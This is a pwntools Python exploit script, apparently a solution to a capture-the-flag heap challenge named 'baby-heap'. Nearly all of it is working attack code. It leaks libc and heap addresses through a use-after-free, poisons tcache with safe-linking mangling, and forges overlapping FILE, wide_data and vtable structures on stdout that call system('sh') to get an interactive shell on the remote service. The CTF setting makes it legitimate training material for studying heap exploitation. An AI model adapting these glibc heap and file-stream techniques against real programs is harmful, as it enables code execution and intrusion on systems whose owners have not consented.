#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './baby-heap'
elf = context.binary = ELF(exe, checksec=True)
libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-l", "175"]
host, port = 'baby-heap.serv1.cbd2025.cloud', 443

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port, ssl=True)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

c
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def alloc(idx, size, data):
    io.sendlineafter(b':', b'1')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b':', str(size).encode())
    io.sendafter(b':', data)

def view(idx):
    io.sendlineafter(b':', b'2')
    io.sendlineafter(b':', str(idx).encode())

def edit(idx, data):
    io.sendlineafter(b':', b'3')
    io.sendlineafter(b':', str(idx).encode())
    io.sendafter(b':', data)

def free(idx):
    io.sendlineafter(b':', b'4')
    io.sendlineafter(b':', str(idx).encode())

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def exploit():
    global io
    heap = 0x0
    io = initialize()

    for i in range(8):
        alloc(i, 0x100, b'A')
    alloc(8, 0x10, b'guard')
    for i in range(8):
        free(i)
    view(7)

    io.recvuntil(b'Note')
    io.recvuntil(b': ')
    libc.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x203b20
    stdout = libc.sym['_IO_2_1_stdout_']
    stdin = libc.sym['_IO_2_1_stdin_']

    view(6)
    io.recvuntil(b'Note')
    io.recvuntil(b': ')
    heap = demangle(u64(io.recv(6).ljust(8, b'\x00'))) - 0x7f0

    for i in range(3):
        alloc(i, 0x20, b'B')
    alloc(3, 0x10, b'guard')
    for i in range(3):
        free(i)

    edit(2, p64(mangle(heap, stdin+0x30)))

    fp = stdout
    # crafting overlapping IO_FILE, wide_data and wide_vtable
    overlap = b'  sh\x00\x00\x00\x00' # [FILE] _flags | [WIDE DATA] read_ptr
    overlap += flat([
        p64(0x0),               # [WIDE DATA] read_end
        p64(0x0),               # [WIDE DATA] read_base
        p64(0x0),               # [WIDE DATA] write_base
        p64(0x0),               # [WIDE DATA] write_ptr
        p64(0x0),               # [WIDE DATA] write_end
        p64(0x0),               # [WIDE DATA] buf_base
        p64(0x0),               # [WIDE DATA] buf_end 
        p64(0x0),               # [WIDE DATA] save_base
        p64(0x0),               # [WIDE DATA] backup_base 
        p64(0x0),               # [WIDE DATA] save_end
    ])
    overlap += b'\x00' * 8       # [WIDE DATA] state
    overlap += b'\x00' * 8       # [WIDE DATA] last_state

    codecvt = b''
    codecvt += p64(libc.sym['system'])     # [FILE] _chain | [WIDE DATA] codecvt | [VTABLE] __doallocate (at function authenticate, skips the puts because we overwrote stdout)
    codecvt += b'\x00' * 0x18                   # padding
    codecvt += p64(fp - 0x10)                   # [FILE] _lock
    codecvt += p64(0x0) * 2                     # padding
    codecvt += p64(fp+0x8)                      # [FILE] _wide_data
    codecvt += b'\x00' * (0x18 + 4 + 20)        # padding
    codecvt += p64(libc.sym['_IO_wfile_jumps']) # [FILE] vtable
    codecvt += b'\x00' * (0x70 - len(codecvt))  # padding
    
    overlap += codecvt
    overlap += p64(0x0)                         # [WIDE DATA] wchar_t shortbuf[1] (alligned to 8 bytes)
    overlap += p64(fp)                          # [WIDE DATA] vtable

    alloc(0, 0x20, b'C')
    alloc(1, 0x20, flat([
        stdout,
        stdout,
        stdout+0x300,
    ]))

    io.sendline(overlap)

    log.info("libc base; %#x", libc.address)
    log.info("heap base: %#x", heap)
    log.info("stdin: %#x", stdin)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
